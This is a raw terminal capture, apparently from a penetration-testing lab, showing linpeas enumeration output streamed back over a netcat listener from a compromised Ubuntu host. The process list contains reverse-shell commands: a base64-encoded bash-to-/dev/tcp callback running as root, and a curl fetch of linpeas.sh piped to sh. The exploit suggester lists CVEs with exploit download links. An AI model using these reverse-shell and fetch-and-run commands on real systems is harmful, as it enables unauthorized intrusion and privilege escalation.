┌──(kali㉿gobots)-[17Jun2024 17:20:24]-[~/SUT/Alchemy/172.16.0.20]
└─$ nc -lvnp 9002 | tee linpeas.out
listening on [any] 9002 ...
connect to [10.10.14.39] from (UNKNOWN) [10.10.110.1] 8825


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-213-generic (buildd@lcy02-amd64-079) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023
User & Groups: uid=1000(aepike) gid=1000(aepike) groups=1000(aepike),108(lxd)
Hostname: scada
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-213-generic (buildd@lcy02-amd64-079) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.6 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Mon Jun 17 17:20:54 UTC 2024
 17:20:54 up 6 days, 18:10,  0 users,  load average: 0.14, 0.03, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda3

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/sda2	 / ext4 defaults 0 0
/dev/sda3	none	swap	sw	0	0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
USER=aepike
LD_LIBRARY_PATH=/opt/java/jre1.6.0_45/lib/amd64/server:/opt/java/jre1.6.0_45/lib/amd64:/opt/java/jre1.6.0_45/../lib/amd64
SHLVL=3
HOME=/home/aepike
CATALINA_HOME=/opt/tomcat6/apache-tomcat-6.0.53
CATALINA_PID=/opt/tomcat6/apache-tomcat-6.0.53/temp/tomcat.pid
LOGNAME=aepike
JOURNAL_STREAM=9:19312
_=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=6eeed257adaa43ac8693d71e9562b5ba
JAVA_OPTS=-Dfile.encoding=UTF-8 -Dnet.sf.ehcache.skipUpdateCheck=true  -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled  -XX:+UseParNewGC -Xms2g -Xmx4g -Djdk.tls.ephemeralDHKeySize=2048
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
XFILESEARCHPATH=/usr/dt/app-defaults/%L/Dt
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
NLSPATH=/usr/dt/lib/nls/msg/%L/%N.cat
JAVA_HOME=/opt/java/jre
PWD=/
CATALINA_BASE=/opt/tomcat6/apache-tomcat-6.0.53
HISTFILE=/dev/null
CATALINA_OPTS=

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/usr/bin/lxc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ Yes lxc(1) 
Running LXC Containers
+---------+---------+------+-----------------------------------------------+------------+-----------+
|  NAME   |  STATE  | IPV4 |                     IPV6                      |    TYPE    | SNAPSHOTS |
+---------+---------+------+-----------------------------------------------+------------+-----------+
| privesc | RUNNING |      | fd42:47f7:1cf0:5982:216:3eff:fe78:5f06 (eth0) | PERSISTENT | 0         |
+---------+---------+------+-----------------------------------------------+------------+-----------+



                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? .......................... 
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.0  0.2 160072  9244 ?        Ss   Jun10   1:02 /sbin/init maybe-ubiquity
root       708  0.0  0.4 127732 17060 ?        S<s  Jun10   0:01 /lib/systemd/systemd-journald
root       736  0.0  0.0  97712  1896 ?        Ss   Jun10   0:00 /sbin/lvmetad -f
root       737  0.0  0.1  48376  7192 ?        Ss   Jun10   0:01 /lib/systemd/systemd-udevd
systemd+   791  0.0  0.0 141788  3012 ?        Ssl  Jun10   0:01 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   792  0.0  0.1  70496  5104 ?        Ss   Jun10   0:00 /lib/systemd/systemd-resolved
root       928  0.0  0.2  89868 10000 ?        Ss   Jun10   0:00 /usr/bin/VGAuthService
root       929  0.0  0.1 225932  7792 ?        S<sl Jun10   5:05 /usr/bin/vmtoolsd
root     22081  0.0  0.0 225748  2728 ?        S<   Jun11   0:00  _ /usr/bin/vmtoolsd
root     22082  0.0  0.0   4636   884 ?        S<   Jun11   0:00  |   _ /bin/sh -c echo L2Jpbi9iYXNoIC1jICIuIH4vLnByb2ZpbGU7IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDIvOTAwMSAwPiYxIg== | base64 -d | sh
root     22085  0.0  0.0   4636   868 ?        S<   Jun11   0:00  |       _ sh
root     22086  0.0  0.0  11600  3160 ?        S<   Jun11   0:00  |           _ /bin/bash -c . ~/.profile; bash -i >& /dev/tcp/10.10.14.42/9001 0>&1
root     22088  0.0  0.0  20188  3972 ?        S<   Jun11   0:00  |               _ bash -i
root     23007  0.0  0.0 225932  3008 ?        S<   Jun12   0:00  _ /usr/bin/vmtoolsd
root     23008  0.0  0.0   4636   812 ?        S<   Jun12   0:00      _ /bin/sh -c echo L2Jpbi9iYXNoIC1jICIuIH4vLnByb2ZpbGU7IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDIvOTAwMSAwPiYxIg== | base64 -d | sh
root     23011  0.0  0.0   4636   888 ?        S<   Jun12   0:00          _ sh
root     23012  0.0  0.0  11600  3296 ?        S<   Jun12   0:00              _ /bin/bash -c . ~/.profile; bash -i >& /dev/tcp/10.10.14.42/9001 0>&1
root     23014  0.0  0.0  20188  3960 ?        S<   Jun12   0:00                  _ bash -i
root      1270  0.0  0.1  70548  6000 ?        Ss   Jun10   0:00 /lib/systemd/systemd-logind
root      1271  0.0  0.0  30032  3260 ?        Ss   Jun10   0:00 /usr/sbin/cron -f
root      1272  0.0  0.0 110552  2112 ?        Ssl  Jun10   0:11 /usr/sbin/irqbalance --foreground
root      1273  0.0  0.1 286256  6928 ?        Ssl  Jun10   0:05 /usr/lib/accountsservice/accounts-daemon[0m
aepike    1276  0.0  7.2 5542888 290888 ?      Ssl  Jun10   6:46 /opt/java/jre/bin/java -Djava.util.logging.config.file=/opt/tomcat6/apache-tomcat-6.0.53/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dfile.encoding=UTF-8 -Dnet.sf.ehcache.skipUpdateCheck=true -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -Xms2g -Xmx4g -Djdk.tls.ephemeralDHKeySize=2048 -Djava.endorsed.dirs=/opt/tomcat6/apache-tomcat-6.0.53/endorsed -classpath /opt/tomcat6/apache-tomcat-6.0.53/bin/bootstrap.jar -Dcatalina.base=/opt/tomcat6/apache-tomcat-6.0.53 -Dcatalina.home=/opt/tomcat6/apache-tomcat-6.0.53 -Djava.io.tmpdir=/opt/tomcat6/apache-tomcat-6.0.53/temp org.apache.catalina.startup.Bootstrap start
aepike   24225  0.0  0.0  15104  1160 ?        S    Jun14   0:16  _ ping 10.10.14.39
aepike   24244  0.0  0.0  15104  1116 ?        S    Jun14   0:17  _ ping 10.10.14.39
aepike   25700  0.0  0.0  11600  3112 ?        S    17:00   0:00  _ bash /tmp/rev2.sh
aepike   25701  0.0  0.1  21248  4824 ?        S    17:00   0:00  |   _ /bin/bash -i
aepike   25724  0.0  0.2  38968  9768 ?        S    17:02   0:00  |       _ python3 -c import pty; pty.spawn("/bin/bash")
aepike   25725  0.0  0.1  21368  5120 pts/0    Ss+  17:02   0:00  |           _ /bin/bash
aepike   25770  0.0  0.0  11600  3208 ?        S    17:19   0:00  _ bash /tmp/rev2.sh
aepike   25771  0.0  0.1  21248  4840 ?        S    17:19   0:00      _ /bin/bash -i
aepike   25794  0.0  0.2  38968  9884 ?        S    17:20   0:00          _ python3 -c import pty; pty.spawn("/bin/bash")
aepike   25795  0.0  0.1  21368  4864 pts/2    Ss   17:20   0:00              _ /bin/bash
aepike   25805  0.0  0.2 105884  9124 pts/2    S+   17:20   0:00                  _ curl 10.10.14.39:8000/linpeas.sh
aepike   25806  0.1  0.0   5488  2772 pts/2    S+   17:20   0:00                  _ sh
aepike   29362  0.0  0.0   5488  1068 pts/2    S+   17:20   0:00                  |   _ sh
aepike   29365  0.0  0.0  38704  3848 pts/2    R+   17:20   0:00                  |   |   _ ps fauxwww
aepike   29366  0.0  0.0   5488  1068 pts/2    S+   17:20   0:00                  |   _ sh
aepike   25807  0.0  0.0  15720  2200 pts/2    S+   17:20   0:00                  _ nc 10.10.14.39 9002
message+  1277  0.0  0.1  50080  4780 ?        Ss   Jun10   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
syslog    1322  0.0  0.1 263048  5244 ?        Ssl  Jun10   0:00 /usr/sbin/rsyslogd -n
root      1366  0.0  0.0 604928  2516 ?        Ssl  Jun10   0:04 /usr/bin/lxcfs /var/lib/lxcfs/
daemon[0m    1373  0.0  0.0  28336  2404 ?        Ss   Jun10   0:00 /usr/sbin/atd -f
root      1381  0.0  0.7 1409540 28460 ?       Ssl  Jun10   0:17 /usr/lib/snapd/snapd
root      1383  0.0  0.1 288884  6608 ?        Ssl  Jun10   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1456  0.0  0.0  14896  2044 tty1     Ss+  Jun10   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root      1500  0.0  0.0 141128  1576 ?        Ss   Jun10   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
www-data  1501  0.0  0.1 144080  7492 ?        S    Jun10   0:00  _ nginx: worker process
www-data  1502  0.0  0.1 144132  7132 ?        S    Jun10   0:00  _ nginx: worker process
root      1540  0.0  0.1  72304  6484 ?        Ss   Jun10   0:00 /usr/sbin/sshd -D
root     21546  0.0  0.7 1156612 31560 ?       Ssl  Jun11   0:37 /usr/lib/lxd/lxd --group lxd --logfile=/var/log/lxd/lxd.log
aepike   25928  0.0  0.0  92032   596 ?        Ss   Jun11   0:00 gpg-agent --homedir /home/aepike/.gnupg --use-standard-socket --daemon[0m
lxd      21712  0.0  0.0  51604   388 ?        S    Jun11   0:00 dnsmasq --strict-order --bind-interfaces --pid-file=/var/lib/lxd/networks/lxdbr0/dnsmasq.pid --except-interface=lo --interface=lxdbr0 --quiet-dhcp --quiet-dhcp6 --quiet-ra --listen-address=10.107.185.1 --dhcp-no-override --dhcp-authoritative --dhcp-leasefile=/var/lib/lxd/networks/lxdbr0/dnsmasq.leases --dhcp-hostsfile=/var/lib/lxd/networks/lxdbr0/dnsmasq.hosts --dhcp-range 10.107.185.2,10.107.185.254,1h --listen-address=fd42:47f7:1cf0:5982::1 --enable-ra --dhcp-range ::,constructor:lxdbr0,ra-stateless,ra-names -s lxd -S /lxd/ --conf-file=/var/lib/lxd/networks/lxdbr0/dnsmasq.raw -u lxd
  └─(Caps) 0x0000000000003000=cap_net_admin,cap_net_raw
root     21829  0.0  0.0   1584   888 ?        Ss   Jun11   0:00  _ /sbin/init
root     21993  0.0  0.0   1584   944 pts/1    Ss+  Jun11   0:00      _ /sbin/getty 38400 console

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
-rwxr-xr-x 1 root   root    1113504 Apr 18  2022 /bin/bash
lrwxrwxrwx 1 root   root          4 Aug  5  2019 /bin/sh -> dash
-rwxr-xr-x 1 root   root     129096 Mar  2  2023 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root   root     219272 Mar  2  2023 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root   root     383040 Mar  2  2023 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root   root      38976 Mar  2  2023 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root   root     588224 Mar  2  2023 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root   root      56552 Sep 16  2020 /sbin/agetty
lrwxrwxrwx 1 root   root          6 Sep 16  2020 /sbin/getty -> agetty
lrwxrwxrwx 1 root   root         20 Mar  2  2023 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root   root      84104 Jan 23  2020 /sbin/lvmetad
-rwxr-xr-x 1 root   root     236584 Oct 25  2022 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root   root      18504 Jun  7  2022 /usr/bin/lxcfs
-rwxr-xr-x 1 root   root     129248 Sep 19  2022 /usr/bin/VGAuthService
-rwxr-xr-x 1 root   root      55552 Sep 19  2022 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root   root     182552 Nov  2  2020 /usr/lib/accountsservice/accounts-daemon[0m
-rwxr-xr-x 1 root   root   18760664 Mar 24  2022 /usr/lib/lxd/lxd
-rwxr-xr-x 1 root   root      14552 Jan 12  2022 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root   root   32888400 May 29  2023 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root   root      26632 Feb 20  2018 /usr/sbin/atd
-rwxr-xr-x 1 root   root      47416 May 10  2022 /usr/sbin/cron
-rwxr-xr-x 1 root   root      64184 Jan  9  2019 /usr/sbin/irqbalance
-rwxr-xr-x 1 root   root     684584 May  3  2022 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root   root     790952 Mar 30  2022 /usr/sbin/sshd

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 791 with ppid 1 is run by user systemd-timesync but the ppid user is root
Proc 792 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 1276 with ppid 1 is run by user aepike but the ppid user is root
Proc 1277 with ppid 1 is run by user messagebus but the ppid user is root
Proc 1322 with ppid 1 is run by user syslog but the ppid user is root
Proc 1373 with ppid 1 is run by user daemon but the ppid user is root
Proc 1501 with ppid 1500 is run by user www-data but the ppid user is root
Proc 1502 with ppid 1500 is run by user www-data but the ppid user is root
Proc 21712 with ppid 1 is run by user lxd but the ppid user is root
Proc 25928 with ppid 1 is run by user aepike but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID   TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Apr  2 12:11 .
drwxr-xr-x 94 root root 4096 Apr 10 16:05 ..
-rw-r--r--  1 root root  589 Jan 30  2019 mdadm
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug  5  2019 popularity-contest

/etc/cron.daily:
total 56
drwxr-xr-x  2 root root 4096 Apr  2 12:14 .
drwxr-xr-x 94 root root 4096 Apr 10 16:05 ..
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 30  2019 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr  2 12:11 .
drwxr-xr-x 94 root root 4096 Apr 10 16:05 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr  2 12:11 .
drwxr-xr-x 94 root root 4096 Apr 10 16:05 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Apr  2 12:14 .
drwxr-xr-x 94 root root 4096 Apr 10 16:05 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  403 Mar  4 11:04 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES
Mon 2024-06-17 23:25:14 UTC  6h left     Sun 2024-06-16 23:25:14 UTC  17h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Tue 2024-06-18 06:05:51 UTC  12h left    Mon 2024-06-17 13:02:12 UTC  4h 18min ago motd-news.timer              motd-news.service
Mon 2024-06-24 00:00:00 UTC  6 days left Mon 2024-06-17 00:00:00 UTC  17h ago      fstrim.timer                 fstrim.service
n/a                          n/a         Mon 2024-06-10 23:10:51 UTC  6 days ago   apt-daily-upgrade.timer      apt-daily-upgrade.service
n/a                          n/a         Mon 2024-06-10 23:10:51 UTC  6 days ago   apt-daily.timer              apt-daily.service
n/a                          n/a         n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a         n/a                          n/a          ua-timer.timer               ua-timer.service
n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

